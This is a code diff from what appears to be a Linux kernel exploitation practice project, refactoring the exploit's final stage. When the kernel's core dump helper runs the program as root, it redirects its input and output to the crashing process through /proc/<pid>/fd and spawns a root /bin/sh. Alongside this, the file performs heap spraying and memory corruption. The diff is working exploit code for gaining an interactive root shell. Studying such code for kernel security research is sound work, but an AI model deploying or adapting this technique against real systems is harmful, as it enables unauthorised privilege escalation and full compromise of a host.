@@ -41,6 +41,7 @@
 #include <sys/xattr.h>
 #include <sys/user.h>
 #include <sys/sendfile.h>
+#include <linux/limits.h>
 #include "drill.h"
 
 #define STR_EXPAND(arg) #arg
@@ -91,7 +92,7 @@ int do_cpu_pinning(int cpu_n)
 	return EXIT_SUCCESS;
 }
 
-int run_sh(void)
+void run_sh(void)
 {
 	pid_t pid = -1;
 	char *args[] = {
@@ -105,7 +106,7 @@ int run_sh(void)
 
 	if (pid < 0) {
 		perror("[-] fork");
-		return EXIT_FAILURE;
+		return;
 	}
 
 	if (pid == 0) {
@@ -117,8 +118,6 @@ int run_sh(void)
 
 		printf("[+] /bin/sh finished\n");
 	}
-
-	return EXIT_SUCCESS;
 }
 
 void init_payload(char *p, size_t size)
@@ -303,6 +302,79 @@ err:
 	}
 }
 
+int transfer_io_to_pid(pid_t target_pid)
+{
+	int ret = EXIT_FAILURE;
+	char target_stdin[PATH_MAX] = { 0 };
+	char target_stdout[PATH_MAX] = { 0 };
+	char target_stderr[PATH_MAX] = { 0 };
+	int stdin_fd = -1;
+	int stdout_fd = -1;
+	int stderr_fd = -1;
+
+	snprintf(target_stdin, sizeof(target_stdin), "/proc/%d/fd/0", target_pid);
+	stdin_fd = open(target_stdin, O_RDONLY);
+	if (stdin_fd < 0) {
+		perror("[-] open stdin_fd");
+		goto err;
+	}
+
+	snprintf(target_stdout, sizeof(target_stdout), "/proc/%d/fd/1", target_pid);
+	stdout_fd = open(target_stdout, O_WRONLY);
+	if (stdout_fd < 0) {
+		perror("[-] open stdout_fd");
+		goto err;
+	}
+
+	snprintf(target_stderr, sizeof(target_stderr), "/proc/%d/fd/2", target_pid);
+	stderr_fd = open(target_stderr, O_WRONLY);
+	if (stderr_fd < 0) {
+		perror("[-] open stderr_fd");
+		goto err;
+	}
+
+	ret = dup2(stdin_fd, 0);
+	if (ret < 0) {
+		perror("[-] dup2 stdin_fd");
+		goto err;
+	}
+
+	ret = dup2(stdout_fd, 1);
+	if (ret < 0) {
+		perror("[-] dup2 stdout_fd");
+		goto err;
+	}
+
+	ret = dup2(stderr_fd, 2);
+	if (ret < 0) {
+		perror("[-] dup2 stderr_fd");
+		goto err;
+	}
+
+	return EXIT_SUCCESS;
+
+err:
+	if (stdin_fd >= 0) {
+		ret = close(stdin_fd);
+		if (ret != 0)
+			perror("[-] close stdin_fd");
+	}
+
+	if (stdout_fd >= 0) {
+		ret = close(stdout_fd);
+		if (ret != 0)
+			perror("[-] close stdout_fd");
+	}
+
+	if (stderr_fd >= 0) {
+		ret = close(stderr_fd);
+		if (ret != 0)
+			perror("[-] close stderr_fd");
+	}
+
+	return EXIT_FAILURE;
+}
+
 int main(int argc, char **argv)
 {
 	pid_t pid = -1;
@@ -311,43 +383,30 @@ int main(int argc, char **argv)
 	int ret = EXIT_FAILURE;
 	int act_fd = -1;
 	int spray_fd = -1;
-	int stdinfd, stdoutfd, stderrfd = -1;
-	char path0[64], path1[64], path2[64];
 
 	if (argc > 1) {
-		pid = strtoull(argv[1], NULL, 10);
-		snprintf(path0, sizeof(path0), "/proc/%d/fd/0", pid);
-		snprintf(path1, sizeof(path1), "/proc/%d/fd/1", pid);
-		snprintf(path2, sizeof(path2), "/proc/%d/fd/2", pid);
-		stdinfd = open(path0, O_RDONLY);
-		stdoutfd = open(path1, O_WRONLY);
-		stderrfd = open(path2, O_WRONLY);
-		if (stdinfd < 0 || stdoutfd < 0 || stderrfd < 0) {
-			perror("[-] open");
-			goto end;
-		}
-		if (dup2(stdinfd, 0) < 0 || dup2(stdoutfd, 1) < 0 ||
-		    dup2(stderrfd, 2) < 0) {
-			perror("[-] dup2");
-			close(stdinfd);
-			close(stdoutfd);
-			close(stderrfd);
-			goto end;
+		/*
+		 * The kernel executes this program with one argument from the core dump helper.
+		 * The argument is pid of the process that provoked the core dump.
+		 * Let's check root privileges, pass input/output to that process,
+		 * and start a root shell.
+		 */
+		if (getuid() != 0 || geteuid() != 0) {
+			printf("[-] this program should be executed with one argument only as root\n");
+			return EXIT_FAILURE;
 		}
 
-		if (getuid() == 0 && geteuid() == 0) {
-			printf("[+] finish as: uid=0, euid=0, start sh...\n");
-			result = EXIT_SUCCESS;
-			if (run_sh() == EXIT_FAILURE) {
-				perror("[-] runnig shell");
-				goto end;
-			}
-			goto end;
-		} else {
-			printf("[-] heap spraying\n");
+		pid = strtoul(argv[1], NULL, 10);
+		ret = transfer_io_to_pid(pid);
+		if (ret == EXIT_FAILURE) {
+			printf("[-] failed to transfer input/output to pid %d\n", pid);
+			return EXIT_FAILURE;
 		}
+
+		run_sh();
+
+		return EXIT_SUCCESS;
 	}
-
 
 	/*
 	 * In the parent process we perform the memory corruption, and in the child
@@ -435,11 +494,6 @@ int main(int argc, char **argv)
 	printf("[+] DRILL_ACT_CALLBACK\n");
 
 end:
-	if (stdinfd > 0 || stdoutfd > 0 || stderrfd > 0) {
-		if (close(stdinfd) < 0 || close(stdoutfd) < 0 || close(stderrfd) < 0) {
-			perror("[-] close");
-		}
-	}
 	if (spray_fd >= 0) {
 		ret = close(spray_fd);
 		if (ret != 0)
